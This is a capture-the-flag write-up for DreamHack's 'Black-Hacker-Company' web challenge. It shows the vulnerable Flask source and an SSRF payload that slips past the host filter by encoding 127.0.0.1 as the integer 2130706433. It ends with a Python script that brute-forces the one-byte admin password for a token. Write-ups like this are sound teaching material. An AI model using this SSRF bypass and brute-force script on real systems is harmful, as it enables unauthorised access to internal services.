# Black-Hacker-Company — DreamHack

> **Room / Challenge:** Black-Hacker-Company (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** DreamHack
- **Challenge:** Black-Hacker-Company (web)
- **Link**: `https://dreamhack.io/wargame/challenges/1834`
- **Level:** `2`
- **Date:** `22-11-2025`

---

## Goal

Bypass filter and leveraging SSRF to get the flag.

## My Solution

The `app.py` is simple with three routes:

```python
@app.route('/user-page', methods=['GET'])
def user():
    url = request.args.get('url')

    if not url:
        return jsonify({"swap": "Write URL"}), 400

    if not any(allow in url for allow in ALLOW_HOST):
        return jsonify({"swap": "URL not allowed"}), 403

    for bad in BLACK_LIST:
        if bad in url.lower():
            return jsonify({"swap": "BAN LIST"}), 403

    try:
        result = subprocess.run(
            ["curl", "-s", url],
            text=True,
            capture_output=True,
            check=True
        )
        return jsonify({"response": result.stdout})

    except subprocess.CalledProcessError as e:
        return jsonify({"swap": "Error!~", "details": str(e)}), 500

@app.route('/access-token', methods=['GET'])
def admin():
    if request.remote_addr in ["127.0.0.1"]:
        password = request.args.get("password")

        if password:
            if password == PASSWORD:
                return jsonify({"server": TOKEN}), 200
            else:
                return jsonify({"server": "Nop~ Password Wrong><"}), 403
        else:
            return jsonify({"server": "Write Password!"}), 400
    else:
        return jsonify({"server": "Only Localhost Can Access : )"}), 403

@app.route('/admin', methods=['GET'])
def check():
    if request.args.get("token") == TOKEN:
        return "<h1>dotori-company : $#@&*(@#&*(@)) BeePPP.. </h1>" + FLAG
    else:
        return jsonify({"server": "you are not admin..."}), 403
```

The `/access-token` will check our given password and if correct it will returned token which will be used to get the flag in `/admin`. However, `/access-token` just accepts request from `127.0.0.1` IP so we have to use the `/user-page`. The filter:

```python
BLACK_LIST = ['file', 'dict', 'sftp', 'tftp', 'ldap', 'netdoc', 'localhost', 'gopher', '127.0.0.1']
ALLOW_HOST = ['abcd.com', 'asdf.com', 'example.com']
```

`/user-page` has a BLACK_LIST and ALLOW_HOST, but it is still easy to bypass this and make a request to the `/access-token` from this route. We will use this payload:

```
http://2130706433:5000/access-token?password={hex_pass}&dummy=example.com
```

URL-encoded this to avoid any errors:

```
http%3A%2F%2F2130706433%3A5000%2Faccess-token%3Fpassword%3D{hex_pass}%26dummy%3Dexample.com
```

Then the password check in `/access-token` is easy to brute-force it just use one random byte (00 - FF in hex):

```python
PASSWORD = f"{random.randint(0, 255):02X}"
```

We just need a simple brute-force command to get the correct password and get the token for the flag. My brute-force script:

```python
import requests

target_url = "http://host8.dreamhack.games:18989"

for i in range(256):
    # Generate Hex Password (00, 01, ... FE, FF)
    hex_pass = f"{i:02X}"

    res = requests.get(url=f"{target_url}/user-page?url=http%3A%2F%2F2130706433%3A5000%2Faccess-token%3Fpassword%3D{hex_pass}%26dummy%3Dexample.com")
    print(f'Tried {hex_pass}')

    if "Nop~ Password Wrong><" not in res.text:
        print(f'Found correct: {hex_pass}')
        print(res.text)
        break
```

![Guide image](./screenshots/1.png)

Use the token in `/admin` to get the flag:
![Guide image](./screenshots/2.png)
